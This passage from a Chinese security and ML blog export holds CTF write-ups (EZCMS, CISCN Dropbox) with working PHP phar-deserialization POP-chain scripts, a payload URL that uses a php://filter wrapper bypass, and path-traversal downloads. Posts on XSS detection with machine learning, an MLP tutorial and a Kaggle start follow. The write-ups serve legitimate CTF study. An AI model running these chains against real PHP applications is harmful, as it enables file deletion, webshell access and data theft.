参考链接https://xz.aliyun.com/t/2308https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E6%9E%90Python-Flask-SSTI/#0x05-%E7%BB%93%E5%90%88Flask%E5%92%8CJinja2%E7%89%B9%E6%80%A7%E7%9A%84%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%8A%80%E5%B7%A7https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93https://www.anquanke.com/post/id/188172https://0day.work/jinja2-template-injection-filter-bypasses/https://p0sec.net/index.php/archives/120/","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/tags/CTF/"}]},{"title":"ctf杀题合集","slug":"ctf杀题合集","date":"2019-09-09T14:14:14.000Z","updated":"2019-12-15T14:51:34.000Z","comments":true,"path":"2019/09/09/ctf杀题合集/","link":"","permalink":"http://yoursite.com/2019/09/09/ctf%E6%9D%80%E9%A2%98%E5%90%88%E9%9B%86/","excerpt":"又要开始学ctf了，不知道第几次了，这次会有成绩吗？不知道，但总得迈出步吧。","text":"又要开始学ctf了，不知道第几次了，这次会有成绩吗？不知道，但总得迈出步吧。前阵子推荐龙博士去xman的夏令营，他回来后热情高涨，决定开始ctf征程，我也得尽力吧。大概每天一题，一周五六道吧，虽然已经入了坑好几年，还是得慢慢来。这两天打了护网杯和bytectf，依然是体验卡，大概记录一下，可惜环境关的很快复现不了。 EZCMS扫目录有www.zip源码泄露，打开之后大概看一下。 1234567891011function is_admin()&#123; $secret = &quot;********&quot;; $username = $_SESSION[&#x27;username&#x27;]; $password = $_SESSION[&#x27;password&#x27;]; if ($username == &quot;admin&quot; &amp;&amp; $password != &quot;admin&quot;)&#123; if ($_COOKIE[&#x27;user&#x27;] === md5($secret.$username.$password))&#123; return 1; &#125; &#125; return 0;&#125; 标准的哈希扩展攻击，hashpump跑一下，用admin/123456登录，改cookie，获得上传权限。 试了试上传好像没过滤，传个php成功了，啥套路。不过马上发现传上去的文件都不能直接访问，会500，只能通过view.php查看。默认目录下有个.htaccess文件，这个500其实就是它造成的。再看看源码，给了源码又没啥注入点，估计是反序列化的套路，找找看发现有个File对象，属性都是public，很像。观察这个类，发现可控的文件路径传进了mime_content_type中，前两天suctf的wrietup中提到这个函数也可以触发phar反序列化，所以这里形成了漏洞： 123456789101112public function view_detail()&#123; if (preg_match(&#x27;/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i&#x27;, $this-&gt;filepath))&#123; die(&quot;nonono~&quot;); &#125; $mine = mime_content_type($this-&gt;filepath); $store_path = $this-&gt;open($this-&gt;filename, $this-&gt;filepath); $res[&#x27;mine&#x27;] = $mine; $res[&#x27;store_path&#x27;] = $store_path; return $res;&#125; 再找找能利用的魔法方法，发现Profile类里面有个__call: 1234function __call($name, $arguments)&#123; $this-&gt;admin-&gt;open($this-&gt;username, $this-&gt;password);&#125; 这里有个open方法，套路就是找其他有open方法的自带类，跑一下： 12345678&lt;?php foreach (get_declared_classes() as $class) &#123; foreach (get_class_methods($class) as $method) &#123; if ($method == &quot;open&quot;) echo &quot;$class-&gt;$method\\n&quot;; &#125; &#125;?&gt; 有四个分别是SessionHandler、ZipArchive、XMLReader、SQLite3。其中ZipArchive-&gt;open()方法的ZipArchive::OVERWRITE选项可以用来删除文件，正好可以用来解决.htaccess，就可以正常访问上传的php文件了。触发的点是File类中的析构函数调用了checker的upload_file方法，而ZipArchive类中没有这个方法，触发了__call函数，调用了open方法，实现删除文件。 12345678910111213141516171819202122232425262728293031&lt;?phpclass File&#123; public $filename; public $filepath; public $checker; function __construct($filename, $filepath) &#123; $this-&gt;filepath = $filepath; $this-&gt;filename = $filename; &#125;&#125;class Profile&#123; public $username; public $password; public $admin;&#125;$a = new File();$a-&gt;checker = new Profile();$a-&gt;checker-&gt;username = &quot;/var/www/html/sandbox/84aa202da71a9c0f4214025ba4583481/.htaccess&quot;;$a-&gt;checker-&gt;password = ZipArchive::OVERWRITE | ZipArchive::CREATE;$a-&gt;checker-&gt;admin = new ZipArchive();$phar = new Phar(&quot;1.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub$phar-&gt;setMetadata($a); $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件$phar-&gt;stopBuffering();?&gt; 然后是调用phar的方法，这里限制了路径开头不能有phar，还是suctf的writeup提到可以用伪协议绕过。这样payload就是112.126.102.158:9999/view.php?filename=2fa0baf1c751e2e9645ea67da0792644.phar&amp;filepath=php://filter/read=convert.base64-encode/resource=phar://./sandbox/84aa202da71a9c0f4214025ba4583481/2fa0baf1c751e2e9645ea67da0792644.phar触发后直接访问上传的php文件就行了，不要再访问upload.php否则会又生成.htaccess 其实后半部分基本是这道题https://corb3nik.github.io/blog/insomnihack-teaser-2018/file-vault ###dropbox地址：https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web1]Dropbox这题套路差不多，也是phar触发的反序列化，每次比赛都有这样的题。。。这题没啥说的，主要是细心。随便注册个账号，直接登录进去，有三个功能：上传、下载、删除。肯定要试试任意下载，果然有一个。先试了passwd验证了之后想开始找目录，找了半天发现用../../index.php就行了。下载源码分析几个主要的文件，分别是class.php、download.php和delete.php。class.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160&lt;?phperror_reporting(0);$dbaddr = &quot;127.0.0.1&quot;;$dbuser = &quot;root&quot;;$dbpass = &quot;root&quot;;$dbname = &quot;dropbox&quot;;$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);class User &#123; public $db; public function __construct() &#123; global $db; $this-&gt;db = $db; &#125; public function user_exist($username) &#123; $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;store_result(); $count = $stmt-&gt;num_rows; if ($count === 0) &#123; return false; &#125; return true; &#125; public function add_user($username, $password) &#123; if ($this-&gt;user_exist($username)) &#123; return false; &#125; $password = sha1($password . &quot;SiAchGHmFx&quot;); $stmt = $this-&gt;db-&gt;prepare(&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;); $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password); $stmt-&gt;execute(); return true; &#125; public function verify_user($username, $password) &#123; if (!$this-&gt;user_exist($username)) &#123; return false; &#125; $password = sha1($password . &quot;SiAchGHmFx&quot;); $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;bind_result($expect); $stmt-&gt;fetch(); if (isset($expect) &amp;&amp; $expect === $password) &#123; return true; &#125; return false; &#125; public function __destruct() &#123; $this-&gt;db-&gt;close(); &#125;&#125;class FileList &#123; private $files; private $results; private $funcs; public function __construct($path) &#123; $this-&gt;files = array(); $this-&gt;results = array(); $this-&gt;funcs = array(); $filenames = scandir($path); $key = array_search(&quot;.&quot;, $filenames); unset($filenames[$key]); $key = array_search(&quot;..&quot;, $filenames); unset($filenames[$key]); foreach ($filenames as $filename) &#123; $file = new File(); $file-&gt;open($path . $filename); array_push($this-&gt;files, $file); $this-&gt;results[$file-&gt;name()] = array(); &#125; &#125; public function __call($func, $args) &#123; array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) &#123; $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); &#125; &#125; public function __destruct() &#123; $table = &#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;; $table .= &#x27;&lt;thead&gt;&lt;tr&gt;&#x27;; foreach ($this-&gt;funcs as $func) &#123; $table .= &#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27; . htmlentities($func) . &#x27;&lt;/th&gt;&#x27;; &#125; $table .= &#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;; $table .= &#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;; foreach ($this-&gt;results as $filename =&gt; $result) &#123; $table .= &#x27;&lt;tr&gt;&#x27;; foreach ($result as $func =&gt; $value) &#123; $table .= &#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27; . htmlentities($value) . &#x27;&lt;/td&gt;&#x27;; &#125; $table .= &#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27; . htmlentities($filename) . &#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;; $table .= &#x27;&lt;/tr&gt;&#x27;; &#125; echo $table; &#125;&#125;class File &#123; public $filename; public function open($filename) &#123; $this-&gt;filename = $filename; if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123; return true; &#125; else &#123; return false; &#125; &#125; public function name() &#123; return basename($this-&gt;filename); &#125; public function size() &#123; $size = filesize($this-&gt;filename); $units = array(&#x27; B&#x27;, &#x27; KB&#x27;, &#x27; MB&#x27;, &#x27; GB&#x27;, &#x27; TB&#x27;); for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024; return round($size, 2).$units[$i]; &#125; public function detele() &#123; unlink($this-&gt;filename); &#125; public function close() &#123; return file_get_contents($this-&gt;filename); &#125;&#125;?&gt; download.php 1234567891011121314151617181920212223242526&lt;?phpsession_start();if (!isset($_SESSION[&#x27;login&#x27;])) &#123; header(&quot;Location: login.php&quot;); die();&#125;if (!isset($_POST[&#x27;filename&#x27;])) &#123; die();&#125;include &quot;class.php&quot;;ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);chdir($_SESSION[&#x27;sandbox&#x27;]);$file = new File();$filename = (string) $_POST[&#x27;filename&#x27;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) === false) &#123; Header(&quot;Content-type: application/octet-stream&quot;); Header(&quot;Content-Disposition: attachment; filename=&quot; . basename($filename)); echo $file-&gt;close();&#125; else &#123; echo &quot;File not exist&quot;;&#125;?&gt; delete.php 123456789101112131415161718192021222324252627&lt;?phpsession_start();if (!isset($_SESSION[&#x27;login&#x27;])) &#123; header(&quot;Location: login.php&quot;); die();&#125;if (!isset($_POST[&#x27;filename&#x27;])) &#123; die();&#125;include &quot;class.php&quot;;chdir($_SESSION[&#x27;sandbox&#x27;]);$file = new File();$filename = (string) $_POST[&#x27;filename&#x27;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123; $file-&gt;detele(); Header(&quot;Content-type: application/json&quot;); $response = array(&quot;success&quot; =&gt; true, &quot;error&quot; =&gt; &quot;&quot;); echo json_encode($response);&#125; else &#123; Header(&quot;Content-type: application/json&quot;); $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;File not exist&quot;); echo json_encode($response);&#125;?&gt; 先找找有没有什么敏感函数，File类中open方法有file_exists可以触发phar的反序列化，close方法有file_get_contents可以读内容。所有就根据这两处找找利用链。最开始想到就是User类中的析构函数调用了db属性的close方法，可以把db赋值为一个File类，调用同名函数。但是这有个问题，读完了文件并没有回显的地方，所以这其实是个坑。再看看发现回显是在FileList中call方法给list赋值，然后destruct中打印。运行这个生成phar文件 123456789101112131415161718192021222324&lt;?php class User &#123; public $db; &#125; class FileList &#123; private $files; public function __construct()&#123; $this-&gt;files=array(new File()); &#125; &#125; class File&#123; public $filename = &quot;/flag.txt&quot;; &#125; $o = new User(); $o-&gt;db =new FileList(); $phar = new Phar(&quot;phar.phar&quot;); $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering(); copy(&quot;phar.phar&quot;,&quot;test.gif&quot;)?&gt; User-&gt;db是FileList类，Userdestruct时会调用db的close方法，因为FileList没有close方法所以触发call函数，call里面的逻辑就是再去调用$file的同名方法，$file是一个File类，所以就调用了File的close方法，读取了文件，存到FileList类的result中，destruct时候打印到页面。有了pop链然后就是找触发反序列化的点，看上去有三个参数可控点可以触发，分别是download.php中和delete.php中调用的File类的open方法，其中有file_exist函数。另外是delete.php中调用的File的delete方法，里面有unlink函数。但实际上unlink那里的没办法传参，参数是不可控的，只能通过open方法。而download中的open方法前面被open_basedir限制了路径，没办法利用。所以最后的触发点就是delete.php中的filename参数。上传伪装的phar文件test.gif，然后向delete.php用post发送filename=phar://test.gif就会在返回值中打印出flag ####参考链接https://altman.vip/2019/09/09/ByteCTF-WEB/https://blog.zeddyu.info/2019/08/24/SUCTF-2019/https://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize()/https://www.fuzzer.xyz/2019/04/29/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E6%B5%85%E6%9E%90/http://adm1n.design/2019/09/10/Ciscn%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Dropbox/https://xz.aliyun.com/t/2715","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/tags/CTF/"}]},{"title":"机器学习检测恶意url","slug":"机器学习检测恶意url","date":"2019-07-03T14:56:13.000Z","updated":"2019-07-04T15:43:16.000Z","comments":true,"path":"2019/07/03/机器学习检测恶意url/","link":"","permalink":"http://yoursite.com/2019/07/03/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A3%80%E6%B5%8B%E6%81%B6%E6%84%8Furl/","excerpt":"尝试下机器学习在安全方面的应用，因为数据集不好找，用的是别人收集的xss数据，实现一个简单的xss攻击检测。","text":"尝试下机器学习在安全方面的应用，因为数据集不好找，用的是别人收集的xss数据，实现一个简单的xss攻击检测。首先处理数据，分别读取正常url和含有xss攻击payload的url，去重并解码，统计数量： 123456normal = pd.read_csv(&#x27;normal_examples.csv&#x27;,header = None)xssed = pd.read_csv(&#x27;xssed.csv&#x27;,header = None)xssed = list(set(xssed[0]))normal = list(set(normal[0]))xssed = [urllib.request.unquote(d) for d in xssed]normal = [urllib.request.unquote(d) for d in normal] 攻击样本有28775条，正常样本有162637条,数据不平衡，还要注意一下。之后用正则表达式对数据泛化处理，把数字都替换成0，url中的host都改成u。这步的目的是为了减少分词之后特征的维度。之后用nltk分词，分词的正则大概就是把每个参数名和参数值都切开。最后用空格再把分好的词连起来，方便下一步tfidf计算特征向量。 12345678def word_split(payload,r): payload,num=re.subn(r&#x27;\\d+&#x27;,&quot;0&quot;,payload) reurl = r&#x27;(?&lt;=://).+?(?=/)&#x27; payload,num=re.subn(reurl,&quot;u&quot;,payload) return nltk.regexp_tokenize(payload,r)r = &#x27;(?x)[\\w\\.]+?\\(|\\)|&quot;\\w+?&quot;|\\&#x27;\\w+?\\&#x27;|http://\\w|&lt;/\\w+&gt;|&lt;\\w+&gt;|&lt;\\w+|\\w+=|&gt;|[\\w\\.]+&#x27;all_data = [&#x27; &#x27;.join(word_split(p,r)) for p in all_data] 因为url也没有什么上下文，就用基于词频的tfidf算法就很适合。直接调用TfidfVectorizer方法生成tfidf特征向量，看了下有160416维。之后再生成标签，用来训练的数据就处理好了。 123tfidf_vect = TfidfVectorizer(min_df = 0.0, analyzer=&quot;char&quot;, sublinear_tf=True, decode_error=&#x27;ignore&#x27;,ngram_range=(1,3)) #converting data to vectorsX = tfidf_vect.fit_transform(all_data)y = [0]*len(normal) + [1] * len(xssed) 然后想找一个baseline做对比，想到很多waf就是基于正则来检测xss，上google找了个召回率比较高的正则跑了一下 1234567891011121314151617181920212223def redetect(data): xssre = re.compile(r&quot;&lt;(|\\/|[^\\/&gt;][^&gt;]+|\\/[^&gt;][^&gt;]+)&gt;&quot;) count = 0 for x in data: if xssre.search(x,re.I): count += 1 return counttp = redetect(xssed)fp = redetect(normal)validCount = len(normal)badCount = len(xssed)tn = validCount - fpaccuracy = (tp + tn) / (validCount + badCount)precision = tp / (tp + fp)recall = tp / badCountprint(&quot;Bad samples: %d&quot; % badCount)print(&quot;Good samples: %d&quot; % validCount)print(&quot;Baseline Constant negative: %.6f&quot; % (validCount / (validCount + badCount)))print(&quot;------------&quot;)print(&quot;Accuracy: %f&quot; % accuracy)print(&quot;Precision: %f&quot; % precision)print(&quot;Recall: %f&quot; % recall)print(&quot;F1-Score: %f&quot; % (2 * precision * recall / (precision + recall))) 得到结果 12345678Bad samples: 28775Good samples: 162637Baseline Constant negative: 0.849670------------Accuracy: 0.966058Precision: 0.971792Recall: 0.797359F1-Score: 0.875976 总听说用正则不靠谱，结果确实不咋样，召回率只有八成。接着还是用机器学习算法跑一下吧，二分类考虑逻辑回归和svm，用lr直接导入tfidf特征，因为数据不平衡，加上class_weight参数： 123456X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3, random_state=666)lgs = LogisticRegression(class_weight=&quot;balanced&quot;) lgs.fit(X_train, y_train)predicted = lgs.predict(X_test)fpr, tpr, _ = metrics.roc_curve(y_test, (lgs.predict_proba(X_test)[:, 1]))auc = metrics.auc(fpr, tpr) 跑完之后再对比下评价指标 12345Accuracy: 0.998677Precision: 0.996545Recall: 0.993683F1-Score: 0.995112AUC: 0.999702 确实每项指标都高的不是一星半点，感觉没有跑其他模型的必要了。只是没办法测试是否在真实数据上有过拟合。想用svm测一下，但是训练不出来，直接报内存错误了，用word2vec来embedding之后还是跑不动，看来svm真的开销比较大。不过模型总会有漏判误判，对于xss，还是要进行转义、白名单过滤之类的方法。","categories":[],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://yoursite.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}]},{"title":"多层感知机MLP多分类python实践","slug":"多层感知机MLP多分类python实践","date":"2019-04-12T12:28:09.000Z","updated":"2019-04-13T04:30:02.000Z","comments":true,"path":"2019/04/12/多层感知机MLP多分类python实践/","link":"","permalink":"http://yoursite.com/2019/04/12/%E5%A4%9A%E5%B1%82%E6%84%9F%E7%9F%A5%E6%9C%BAMLP%E5%A4%9A%E5%88%86%E7%B1%BBpython%E5%AE%9E%E8%B7%B5/","excerpt":"之前不太明白神经网络什么层和反向传播什么的，这两天试着写了个纯python+numpy版本的简单神经网络(也就是多层感知机)，感觉对原理清楚了不少。","text":"之前不太明白神经网络什么层和反向传播什么的，这两天试着写了个纯python+numpy版本的简单神经网络(也就是多层感知机)，感觉对原理清楚了不少。首先生成一些不能线性分割的数据，分三类以上，使用softmax作为输出函数来进行分类： 1234567891011121314151617181920212223import numpy as npimport matplotlib.pyplot as pltN = 100 # 每一个类别的生成的点的数量D = 2 # 每个点的维度，这里使用平面，所以是2维数据K = 3 # 类别数量，我们一共生成3个类别的点# 所有的样本数据，一共300个点，每个点用2个维度表示# 所有训练数据就是一个300*2的二维矩阵X = np.zeros((N*K, D))# 标签数据，一共是300个点，每个点对应一个类别，# 所以标签是一个300*1的矩阵y = np.zeros(N*K, dtype=&#x27;uint8&#x27;)np.random.seed(0)# 生成训练数据for j in range(K): ix = range(N*j, N*(j+1)) r = np.linspace(0.0, 1, N) t = np.linspace(j*4, (j+1)*4, N) + np.random.randn(N)*0.2 X[ix] = np.c_[r*np.sin(t), r*np.cos(t)] y[ix] = j plt.scatter(X[:, 0], X[:, 1], c=y, s=40, cmap=plt.cm.Spectral)plt.show() 打印出来是这样的 接着定义一些会用到的函数，包括激活函数和它的导数，以及打印模型的函数等等： 123456789101112131415161718192021222324252627282930313233343536def sigmoid(x): return 1.0 / (1.0 + np.exp(-x))def d_sigmoid(y): return y * (1.0 - y)def tanh(x): return np.tanh(x)def d_tanh(y): return 1. - y**2def softmax(Z): return np.exp(Z) / np.sum(np.exp(Z), axis=1, keepdims=True) def cross_entropy(yhat,y): return -y*np.log(yhat)-(1-y)*np.log(1-yhat)# 一个函数来画决策边界def plot_decision_boundary(data,label,pred_func): # 设定最大最小值，附加一点点边缘填充 x_min, x_max = data[:, 0].min() - .5, data[:, 0].max() + .5 y_min, y_max = data[:, 1].min() - .5, data[:, 1].max() + .5 h = 0.01 xx, yy = np.meshgrid(np.arange(x_min, x_max, h), np.arange(y_min, y_max, h)) # 用预测函数预测一下 Z = pred_func(np.c_[xx.ravel(), yy.ravel()]) Z = Z.reshape(xx.shape) # 然后画出图 plt.contourf(xx, yy, Z, cmap=plt.cm.Spectral) plt.scatter(data[:, 0], data[:, 1], c=label, cmap=plt.cm.Spectral) 先看下只用softmax函数(相当于没有隐藏层的神经网络)做分类的效果： 看到只有直线作为决策边界，正确率也只有51%接下来就是使用神经网络的训练过程了，先来一些原理。简单来说就是每一轮都先计算出一个分类结果(前向传播)，然后与标准答案做对比计算出损失，再由损失反过来修改参数的权重(反向传播)。 首先看前向传播的过程，这个很简单，跟逻辑回归类似。一共有三层，输入层，隐藏层和输出层，输入层传进去的数据X和权重W做矩阵乘法得到Z，之后Z通过激活函数f(sigmoid/tanh/relu)得到A，这样就有了隐藏层的输出，再把隐藏层的输出作为输出层的输入，同样的过程得到Z后通过softmax函数(不是激活函数了)得到预测的结果yhat。代码也很简单，这里考虑了不同的激活函数 1234567891011#forward Z1 = np.dot(X,self.W1) + self.b1 if self.activation == &#x27;sigmoid&#x27;: A1 = sigmoid(Z1) elif self.activation == &#x27;tanh&#x27;: A1 = tanh(Z1) else: #relu A1 = np.maximum(0,Z1) Z2 = np.dot(A1,self.W2) + self.b2 yhat = softmax(Z2) 接着是反向传播的过程，首先要计算出损失，这样才可以对损失求梯度来减小损失。softmax都使用交叉熵作为损失函数，因为这样求导后很简单。具体过程可以看这篇文章https://zhuanlan.zhihu.com/p/37740860得到了输出层的导数是yhat-y，之后由链式法则(这写的参数和上边那个图不一样，A2就是yhat) 1dJ/dW2 = dJ/dA2 * dA2/dZ2 * dZ2/dW2 前两项就是输出层的导数delta3，第三项就是A1继续展开 123dJ/dW1 = dJ/dA1 * dA1/dZ1 * dZ1/dW1 = dJ/dA2 * dA2/dZ2 * dZ2/dA1 * dA1/dZ1 * dZ1/dW1 = delta3 * W2 * d_active(Z1) * X dZ2/dA1就是W2，dA1/dZ1就是激活函数的导数，dZ1/dW1就是X和这张图对照着看，Z和A的下标需要减1 这样代码也很好写了 123456789101112131415161718192021222324252627282930#loss loss = np.mean(cross_entropy(yhat,y))# reg_loss = 0.5*reg*np.sum(self.W1*self.W1) + 0.5*reg*np.sum(self.W2*self.W2)# loss += reg_loss#backward delta3 = yhat - y# y不进行onehot化的话按下面这两行这么写，等价于yhat-y# delta3 = yhat# delta3[range(X.shape[0]),y] -= 1 delta3 /= X.shape[0] #学习率较大的时候必须加，否则不收敛 dJdW2 = np.dot(A1.T,delta3) dJdb2 = np.sum(delta3, axis=0, keepdims=True) if self.activation == &#x27;sigmoid&#x27;: delta2 = np.dot(delta3,self.W2.T)*d_sigmoid(A1) elif self.activation == &#x27;tanh&#x27;: delta2 = np.dot(delta3,self.W2.T)*d_tanh(A1) else: #relu 导数 delta2 = np.dot(delta3,self.W2.T) delta2[A1 &lt;= 0] = 0 dJdW1 = np.dot(X.T,delta2) dJdb1 = np.sum(delta2, axis=0)# dJdW2 += reg * dJdW2# dJdW1 += reg * dJdW1 self.W1 -= self.learning_rate * dJdW1 self.b1 -= self.learning_rate * dJdb1 self.W2 -= self.learning_rate * dJdW2 self.b2 -= self.learning_rate * dJdb2 这样训练函数就写好了，最后预测对softmax的结果取argmax就可以了。完整代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108def sigmoid(x): return 1.0 / (1.0 + np.exp(-x))def d_sigmoid(y): return y * (1.0 - y)def tanh(x): return np.tanh(x)def d_tanh(y): return 1. - y**2def softmax(Z): return np.exp(Z) / np.sum(np.exp(Z), axis=1, keepdims=True) def cross_entropy(yhat,y): return -y*np.log(yhat)-(1-y)*np.log(1-yhat)class MLPClassifier(): &quot;&quot;&quot;多层感知机，BP 算法训练&quot;&quot;&quot; def __init__(self,hid_neurals=10,epochs=1000, batch_size=1, learning_rate=0.01, activation=&#x27;relu&#x27;): &quot;&quot;&quot; :param layers: 网络层结构 :param activation: 激活函数 :param epochs: 迭代轮次 :param learning_rate: 学习率 &quot;&quot;&quot; self.epochs = epochs self.learning_rate = learning_rate self.hid_neurals = hid_neurals self.batch_size = batch_size self.activation = activation# self.reg = 1e-3 # regularization strength def fit(self,X,y): self.W1 = np.random.randn(X.shape[1], self.hid_neurals) self.b1 = np.zeros((1, self.hid_neurals)) self.W2 = np.random.randn(self.hid_neurals,y.shape[1])#分类个数 self.b2 = np.zeros((1, y.shape[1])) for i in range(self.epochs): #forward Z1 = np.dot(X,self.W1) + self.b1 if self.activation == &#x27;sigmoid&#x27;: A1 = sigmoid(Z1) elif self.activation == &#x27;tanh&#x27;: A1 = tanh(Z1) else: #relu A1 = np.maximum(0,Z1) Z2 = np.dot(A1,self.W2) + self.b2 yhat = softmax(Z2) #loss loss = np.mean(cross_entropy(yhat,y))# reg_loss = 0.5*reg*np.sum(self.W1*self.W1) + 0.5*reg*np.sum(self.W2*self.W2)# loss += reg_loss if i % 1000 == 0: print (&quot;iteration %d loss %f&quot; % (i, loss)) #backward delta3 = yhat - y# print(yhat[0]) delta3 /= X.shape[0] #学习率较大的时候必须加，否则不收敛# print(delta3[0]) dJdW2 = np.dot(A1.T,delta3) dJdb2 = np.sum(delta3, axis=0, keepdims=True) if self.activation == &#x27;sigmoid&#x27;: delta2 = np.dot(delta3,self.W2.T)*d_sigmoid(A1) elif self.activation == &#x27;tanh&#x27;: delta2 = np.dot(delta3,self.W2.T)*d_tanh(A1) else: #relu 导数 delta2 = np.dot(delta3,self.W2.T) delta2[A1 &lt;= 0] = 0 dJdW1 = np.dot(X.T,delta2) dJdb1 = np.sum(delta2, axis=0)# dJdW2 += reg * dJdW2# dJdW1 += reg * dJdW1 self.W1 -= self.learning_rate * dJdW1 self.b1 -= self.learning_rate * dJdb1 self.W2 -= self.learning_rate * dJdW2 self.b2 -= self.learning_rate * dJdb2 def predict(self,X): Z1 = np.dot(X,self.W1) + self.b1 if self.activation == &#x27;sigmoid&#x27;: A1 = sigmoid(Z1) elif self.activation == &#x27;tanh&#x27;: A1 = tanh(Z1) else: A1 = np.maximum(0,Z1) Z2 = np.dot(A1,self.W2) + self.b2 yhat = softmax(Z2) return np.argmax(yhat, axis=1)from sklearn import preprocessingmlp = MLPClassifier(epochs=10000,learning_rate=0.1,activation=&#x27;tanh&#x27;)enc = preprocessing.OneHotEncoder()target_train = enc.fit_transform(y.reshape(-1, 1)).toarray() # 对目标集独热编码mlp.fit(X,target_train)plot_decision_boundary(X,y,lambda x:mlp.predict(x))np.mean(mlp.predict(X)==y) 正确率97.7%，还是很有效果的","categories":[],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://yoursite.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}]},{"title":"kaggle磨炼:titanic之灾","slug":"kaggle磨炼-titanic之灾","date":"2019-03-08T14:48:40.000Z","updated":"2019-03-14T02:11:02.000Z","comments":true,"path":"2019/03/08/kaggle磨炼-titanic之灾/","link":"","permalink":"http://yoursite.com/2019/03/08/kaggle%E7%A3%A8%E7%82%BC-titanic%E4%B9%8B%E7%81%BE/","excerpt":"这几天体验了下kaggle，感觉和CTF类似的地方就是经常做的都是无用功。记录一下对泰坦尼克这个题的瞎折腾。","text":"这几天体验了下kaggle，感觉和CTF类似的地方就是经常做的都是无用功。记录一下对泰坦尼克这个题的瞎折腾。题目就是根据已有的信息预测这个人是否能生还。首先导入库和数据,观察下样本的情况 12345678import pandas as pdimport numpy as npimport matplotlib.pyplot as pltfrom pylab import mpldata_train = pd.read_csv(&#x27;train.csv&#x27;)data_test = pd.read_csv(&#x27;test.csv&#x27;)data = pd.concat([data_train,data_test],sort=&#x27;False&#x27;,ignore_index=False)data.info() 1234567891011121314151617&lt;class &#x27;pandas.core.frame.DataFrame&#x27;&gt;Int64Index: 1309 entries, 0 to 417Data columns (total 12 columns):Age 1046 non-null float64Cabin 295 non-null objectEmbarked 1307 non-null objectFare 1308 non-null float64Name 1309 non-null objectParch 1309 non-null int64PassengerId 1309 non-null int64Pclass 1309 non-null int64Sex 1309 non-null objectSibSp 1309 non-null int64Survived 891 non-null float64Ticket 1309 non-null objectdtypes: float64(3), int64(4), object(5)memory usage: 132.9+ KB 